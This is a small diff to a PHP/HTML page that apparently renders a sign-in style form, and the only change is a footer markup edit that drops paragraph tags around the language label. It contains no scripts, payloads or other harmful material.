@@ -33,7 +33,7 @@ require_once('helper.php');
 	<p><a href="">More options</a><span class="text-right"><button type="submit">NEXT</button></span></p>
 </form>
 <footer>
-	<p>English (United States)</p> <img src="assets/img/mq40xx0kce.gif" alt="">
+	English (United States)<img src="assets/img/mq40xx0kce.gif" alt="">
 	<span class="text-right">Help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Privacy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terms</span>
 </footer>
 </body>
